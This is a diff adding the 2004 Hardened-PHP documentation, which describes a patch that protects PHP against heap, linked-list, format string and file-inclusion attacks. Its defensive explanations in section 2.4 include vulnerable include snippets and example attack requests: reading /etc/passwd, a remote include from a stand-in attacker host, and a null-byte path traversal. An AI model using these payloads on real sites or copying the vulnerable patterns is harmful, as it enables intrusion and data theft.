@@ -1,0 +1,417 @@
+------------------------------------------------------------------------
+
+    _  _                _                     _       ___  _  _  ___ 
+   | || | __ _  _ _  __| | ___  _ _   ___  __| | ___ | _ \| || || _ \
+   | __ |/ _` || '_|/ _` |/ -_)| ' \ / -_)/ _` ||___||  _/| __ ||  _/
+   |_||_|\__,_||_|  \__,_|\___||_||_|\___|\__,_|     |_|  |_||_||_|  
+                                                         
+
+--[ Contents ]----------------------------------------------------------
+
+1 - Introduction
+  1.1 - What is Hardened-PHP
+  1.2 - Hardened-PHP's history
+  1.3 - Hardened-PHP's features
+  1.4 - Installing Hardened-PHP
+
+2 - The potential security problems
+  2.1 - Zend memory management
+  2.2 - Zend linked lists
+  2.3 - Format string functions
+  2.4 - Includes
+    2.4.1 - Remote includes
+    2.4.2 - Uploaded files
+    2.4.3 - String cuts
+    2.4.4 - Overlong filenames
+ 
+3 - The Implementation
+  3.1 - System compatibility
+  3.2 - Script compatibility
+  3.3 - Speed impact
+  3.4 - Memory Usage
+
+Appendix A - Project information
+
+Appendix B - Hardened-PHP signature key
+
+
+--[ 1 - Introduction ]--------------------------------------------------
+
+PHP is still the most popular script language and therefore used on
+millions of webservers around the globus. Because of this worldwide
+distribution it is vital that PHP scripts and the PHP engine itself are 
+made resistent against security exploits. 
+
+The Hardened-PHP project was launched to ensure this.
+
+----[ 1.1 - What is Hardened-PHP ]--------------------------------------
+
+Hardened-PHP adds security hardening features to PHP to protect your 
+servers on the one hand against a number of well known problems in 
+hastily written PHP scripts and on the other hand against potential 
+unknown vulnerabilities within the engine itself.
+
+----[ 1.2 - Hardened-PHP's history ]------------------------------------
+
+The idea to create a patched version of PHP which is resistent against
+a lot of attacks is maybe as old as PHP itself. In 2002 a few people
+from OpenBSD users created the PHP auditing project after I released
+my advisories aboute remote holes in PHP. The whole project was not
+really successfull. It seemed quite uncoordinated and the people all
+lost their interest because they never found anything. In the months
+since then I found several remote vulnerabilities in PHP before they
+could make it into a release version. However the codebase is quite
+large and therefore I decided to create Hardened-PHP. The project was
+pulled back several times because of lack of time.
+
+This was until the 17th of April 2004 when I released the first 
+version of Hardened-PHP which had already most of the features wanted
+for the first step. The project was not publicly announced until some
+stranger submitted a story about Hardened-PHP to symlink.ch. This was
+bringing some visitors to the page which was infact a ugly page with
+nearly no information, and no documentation.
+
+A month later at the 16th May 2004 the website was redesigned. Nothing
+professional but good enough for a start. Additionally this document
+was released in its first version to have a basic documentation. On the
+same day the Hardened-PHP 0.1.1 was released with just some small fixes
+for PHP and the patch itself.
+
+----[ 1.3 - Hardened-PHP's features ]-----------------------------------
+
+Hardened-PHP provides:
+
++ Protection of the Zend Memory Manager with canaries
++ Protection of Zend Linked Lists with canaries
++ Protection against internal format string exploits
++ Protection against arbitrary code inclusion
++ Syslog logging of attackers IP
+
+Hardened-PHP advertises itself as Hardened-PHP/x.y.z if you are running
+it as Apache module and have expose_php turned on. 
+
+----[ 1.4 - Installing Hardened-PHP ]-----------------------------------
+
+The process of installing a hardened PHP starts with downloading the
+PHP version supported by the current version of Hardened-PHP from
+
+        http://www.php.net/downloads.php
+
+After downloading the tarball into your temporary installation directory
+(f.e. /home/install) it is recommended that you check the md5sum of the 
+file before you continue. If the hash is correct you can start unpacking
+the tarball by issuing the command:
+
+        tar xfz php-x.y.z.tar.gz  
+
+Now download the Hardened-PHP patch (and it's GPG signature) from 
+
+        http://www.hardened-php.net/download.php
+        
+After checking the signature with GPG you can unpack and apply the patch
+
+        gunzip hardened-php-x.y.z-a.b.c.patch.gz
+        cd php-x.y.z
+        patch -p 1 < ../hardened-php-x.y.z-a.b.c.patch
+        
+From here follow the PHP manual howto install it ony your platform.
+
+
+--[ 2 - The potential security problems ]-------------------------------
+
+Because the featurelist of Hardened-PHP is quite cryptic for someone not
+into PHP and/or not into security, this chapter will provide an intro-
+duction into the problems that could arise if certain structures are
+overwritten or certain functions are used in an unsafe way.
+
+----[ 2.1 - Zend memory management ]------------------------------------
+
+When memory is allocated within PHP this is done with emalloc(). This
+function is a wrapperfunction for malloc() which implements (beside
+some things like a cache for small blocks) a double linked list of
+allocated memory blocks. This list is needed to free all allocated 
+memory at the end of request.
+
+       zend_mem_header                     emalloc() allocates more
+                                           memory than requested because
+    31  30             0                   it has to add 3 header fields
+     +-----------------+                   to the beginning of the block
+     |    p P r e v    |                   
+     +-----------------+                   It should be obvious that an
+     |    p N e x t    |                   overflow into this memory 
+     +---+-------------+                   will first overwrite the 
+     | C +   s i z e   |                   pPrev and pNext fields which
+     +---+-------------+  <--- returned    are the forward and backward
+     |                 |       pointer     pointers in the linked list
+     |                 |                   of allocated memory block.
+     |                 |                   Imagine you are able to 
+     |                 |                   overwrite these fields...
+     .                 .                   
+     .     d a t a     .                   What could actually happen
+     .                 .                   to this memoryblock?
+     |                 |                   It could either be efree()ed
+     |                 |                   or erealloc()ed. In both
+     |                 |                   cases the block is taken off
+     |                 |                   linked list.
+     +-----------------+                   
+                                           
+The remove operation is the standard linked list unlink common to many
+implementations of double linked lists.
+
+      p->pPrev->pNext = p->pNext  AND  p->pNext->pPrev = p->pPrev
+     
+This allows to overwrite nearly arbitrary addresses with nearly 
+arbitrary values if you control p->pPrev and p->pNext, which can lead
+to a code execution exploit.
+
+When Hardened-PHP is activated it will add so called canaries to the
+beginning and the end of each allocated block. These canaries are no
+birds but 32bit wide values which are randomly generated when the
+memory manager is started. Whenever the block is reallocated or freed
+the memory manager will check if the canary values have changed. This
+is sufficient to protect the unlink operations because an attacker 
+cannot guess the random values.
+
+Hardened-PHP uses 2 canaries because this protects against an overflow
+into emalloc()ed memory AND against an overflow out of such a block.
+
+Important: It is necessary to know that 3rd party libraries used by
+PHP will NOT use emalloc() but malloc() directly. This means that heap
+overflows could be still exploitable under some conditions. But this
+check is good enough to ensure that it is not the PHP memory that is
+abused to execute arbitrary code, which is good news because some libc
+versions have very hard/or impossible to exploit implementations of
+malloc(). On those systems heap overflows in PHP would be easily
+exploitable if Hardened-PHP is not activated.
+
+----[ 2.2 - Zend linked lists ]-----------------------------------------
+
+Many internal functions within PHP make use of zend linked lists. These
+lists have a structure which is also very vulnerable to overflows. If
+an attacker would be able cause PHP to overflow a part of memory that
+contains a linked list descriptor structure it would be possible to
+overwrite the stored pointer to the linked list dtor() with a pointer
+to any memory address. This would allow code execution when the list
+is destructed.
+
+Hardened-PHP adds canaries in front of the list descriptor structure
+to protect it against an overflow. Additionally a canary is added to 
+the end because sometimes the descriptors are stored in stack and the
+overflow would come from the other side. Because linked list elements
+are always in heap they only get a prefixed canary.
+
+Whenever an operation is performed on the linked list descriptor or
+one of its elements the canaries will get checked and when an overflow
+is detected the script will be aborted.
+
+----[ 2.3 - Format string functions ]-----------------------------------
+
+For a few years it is now known that format string functions can be
+abused if the format string is user supplied. This is because the %n
+specifier allows to write any values to arbitrary memory addresses.
+PHP comes with its own implementation of snprintf() and a memory self
+allocating variant spprintf(). Both functions implement the %n specifier
+which is not uses at all within PHP. 
+
+Hardened-PHP when activated removes the %n specifier from the internal
+snprintf() and spprintf() functions. Additionally a macro is set to
+replace all calls to the libc snprintf() with the PHP own version. This
+means, that if someone adds a format string bug to PHP in the future,
+it won't be exploitable. (Only if he makes the mistake in snprintf()
+or spprintf() - protecting sprintf() is on the todo list)
+
+----[ 2.4 - Includes ]--------------------------------------------------
+
+Like many other languages PHP allows to include other source files into
+the main script. This is done at execution time and even allows to
+include files on remote systems, which can become a huge security risk
+if the include statements are not protected in a proper way. Actually
+this is the most often used entrypoint of hackers when they succeed in
+hacking a site running a vulnerable PHP script.
+
+Hardened-PHP includes countermeasures for the most often seen mistakes.
+
+------[ 2.4.1 - Remote includes ]---------------------------------------
+
+A script like
+
+<?php
+	include $_REQUEST['aktion'];
+?>
+
+allows the user to supply any filename to the include statement from the
+outside. This means he can simply request
+
+        /vuln.php?aktion=/etc/passwd
+        
+to see your password file in his browser. It is obvious that an attacker
+who knows a way to embed PHP code into a file on your server will be
+able to execute it through this statement. (Examples are logfiles or
+session files). What is maybe new to any PHP beginner is that there is
+a feature called fopen_wrappers which allows to include a file from a
+remote system. This means if this feature is activated (which is the
+default setting) he may request
+
+        /vuln.php?aktion=http://attacker.com/his_code.dat
+        
+which includes any code of his choice. It is more than obvious that this
+feature can be a great security risk for any site that runs code written
+by PHP beginners but disabling this feature could also be a bad idea.
+This is because PHP does not allow to disable remote includes separately
+from remote file support for the other file access functions.
+
+If Hardened-PHP is activated it will disallow any include filename that
+looks like an URL and will log the attempt to syslog. Any URL is maybe
+to strict and will be relaxed in a future version. The strict rule is
+the reason why the fopencookie() regression test fails when Hardened-PHP
+is running.
+
+------[ 2.4.2 - Uploaded files ]----------------------------------------
+
+If the previous example is rewritten to make use of register_globals
+
+<?php
+	include $aktion;
+?>
+
+another not so well known way to include arbitrary code is possible.
+This can be used if fopen_wrappers is turned off but register_globals
+and file_uploads are turned on. In such a situation it is suffient to
+perform a post fileupload to the vulnerable script with aktion as name
+of the file variable. Because register_globals is turned on the variable
+$aktion will contain the temporary filename of the uploaded file. Of
+course this can contain arbitrary PHP code that would get executed
+under this circumstances.
+
+Hardened-PHP will stop such attacks because it does not allow including
+an uploaded file. Like with all violations it will get logged to syslog.
+
+------[ 2.4.3 - String cuts ]-------------------------------------------
+
+Many PHP programmers believe it is sufficient to pre- and postfix some
+controlled values to the userinput to completly protect an include-
+statement. That this assumption is wrong can be seen in this example:
+
+<?php
+        include "templates/".$_REQUEST['template'].".tmpl";
+?>
+
+The author of this code thinks that it is safe to include any file with
+a .tmpl extension on the system. While this maybe is true he forgets
+(or simply does not know) that PHP strings are binary safe, which means
+that anywhere within the userinput could be an ascii NUL char. For the
+underlying filesystem function this is considered as string terminator,
+which means, that a request for
+
+	/vuln.php?template=../../../../../../../etc/passwd%00
+	 
+would infact include the /etc/passwd file because the %00 will truncate
+the extension ".tmpl" from the rest of the string. (This is only valid
+if magic_quotes_gpc is turned off)
+
+To protect against such attacks Hardened-PHP checks if the stringlength
+seen by the filesystem functions is equal to the binarysafe length. If
+they differ the file is not included and the attack is logged.
+
+------[ 2.4.4 - Overlong filenames ]------------------------------------
+
+When including a file Hardened-PHP checks that the supplied filename
+does not exceed the maximum path length. This is done because it doesn't
+add much overhead (for string cut protection we need strlen() anyway),
+but could protect against bufferoverflow attacks on the underlying 
+filesystem functions. If a filename triggers this check it will be
+logged to syslog.
+
+
+--[ 3 - The implementation ]--------------------------------------------
+
+This chapter discusses the compatibility, speed and memory issues which
+are caused by applying the Hardened-PHP patch.
+
+----[ 3.1 - System compatibility ]--------------------------------------
+
+Hardened-PHP is mainly developed on linux systems. This means new 
+versions may not compile on your operating system. I strongly recommend
+reporting such problems to the Hardened-PHP users mailinglist.
+
+----[ 3.2 - Script compatibility ]--------------------------------------
+
+Hardened-PHP passes the PHP 'make test' regression tests with the
+exception of the fopencookie() test. This is not caused by a bug within
+the implementation but by design of the include() protection feature. 
+At the time of writing this document Hardened-PHP simply forbids all 
+stream includes to protect against remote file inclusion. Without this 
+feature the fopencookie() test cannot work and therefore fails.
+
+Future versions of Hardened-PHP will partly restore stream inclusion
+support, to work around this limitation.
+
+----[ 3.3 - Speed impact ]----------------------------------------------
+
+It is believed that the few additional clock cycles spent on the extra
+sanity checks are marginal in comparison to the overhead which is caused
+by the protected functions within the memory management and filesystem
+access functions.
+
+A complete benchmark will be added to this section once it is achieved.
+
+----[ 3.4 - Memory usage ]----------------------------------------------
+
+Hardened-PHP adds canary protection to every allocated block of memory,
+to every linked list and to every linked list element. Additional every
+request remembers the triggering IP address. Combined this means an
+increased of used memory.
+
+This section will be filled with a memory usage benchmark in the future.
+
+
+--[ Appendix A - Project information ]----------------------------------
+
+At the time of writing Hardened-PHP is hosted on Sourceforge.
+
+The official homepage of Hardened-PHP is:
+
+http://www.hardened-php.org
+
+and the Sourceforge project page is reachable under:
+
+http://www.sourceforge.net/projects/hardened-php
+
+You can reach me (the author) directly through the email address
+sesser@php.net . When writing to this address please include the string
+Hardened-PHP in the subject line due to the amount of spam.
+
+You can use this address also to donate money to the project via Paypal.
+
+
+--[ Appendix B - Hardened-PHP signature key ]---------------------------
+
+To ensure authenticity of Hardened-PHP releases they are signed 
+with the following GPG key:
+
+-----BEGIN PGP PUBLIC KEY BLOCK-----
+Version: GnuPG v1.0.6 (GNU/Linux)
+Comment: For info see http://www.gnupg.org
+
+mQGiBECBdjoRBAC5HMCaoPx30w6N4JLx09RfBLx6bo0//JWAaJKpjpvW1FviFNYs
+PXkyGrcrhhVxoh5dC8ByQgWSbT8XMpUv5tPQNwxO0ITbbAU9ipgg5BVDfc82/XaK
+Jr1jq243EQJN7rsce6PF13LIoxQ+LBdYHY6vw9a+9/IO5LMjNw7zW+5pswCg8M0Q
+2jnKZaIAhVCS27LJaUQaL68EAIl6I19HRE7RTJbhY0ZIrKGUKfx+KX0gHb8kXu6q
+WV5fmtO5fH34TrojhgUqBayLtwsxtXr+8QBMz0XNRDuebja8ZaVyLTx+EpI8Dyfm
+ob7vzlS3qJoNrW3h1kse50r/ilm87aB0JP6vwPlZDPC1lu2ZAGSUYEHml5dOmyCi
+5Z8tBACKFry60HlvWQzbnHCSSyMTIcagMnkVuyDDIR63RAqhEmyE7GXh2sYh6aPt
+AWag9ADQVFvTBhx+ssU5gpPahJr29QTrC4VCNTaO03O16qLmqkTKWHZCZbd4EPTg
+trswDZc1PLVwbP0j5RlH8/tQrbY9lMtuS5rUxtaFCLw4ZPWrh7QaSGFyZGVuZWQt
+UEhQIFNpZ25hdHVyZSBLZXmIXQQTEQIAHQUCQIF2OgUJAeEzgAULBwoDBAMVAwID
+FgIBAheAAAoJEEQ5FMwKhkqhSPAAnjXReigGNJXBsoX7z8/EvthX0cTIAJ9cSPil
+WwaTl2vtz7kyguZzRpZz8rkBDQRAgXY8EAQApLYBh8UCMUhDy5bR6Oj4vhMY6cJ4
+pIvwuaHbTXauBXS8UV5MwWvf/qcecM61Qe9SlZqWDTfT47tLgtR16PxmVhPJtQxH
+aRkrxXTKDu9P1evD1zX61/eNhDZw9+MPYMokxZMYS94s5uv/upKZZwu8XzdJtrK3
+YtaNAMn3tXQUKZMAAwUD/ieRxef28ZZ68emOe8KNfd5GP+8Ym7dkiidPBRLqgGmf
+V9AZbMdA2F8VfLuD6B5T5Lj9J35eTKijwLHDD5svl+2zPOSEtUB8mUVp2765kqeb
+jFW7WteKB9pEq59mfgHW5p5gnu66Fh5bggf8rKELj+0hw44F0IEXCQwyHlJ/3lQS
+iEwEGBECAAwFAkCBdjwFCQHhM4AACgkQRDkUzAqGSqG/wwCg7LlZpWdRL5QgUms5
+VVh+fdpHgPIAn3SIXWtsAS2T0Z0V6pjhSQz30ams
+=Gq1L
+-----END PGP PUBLIC KEY BLOCK-----
+
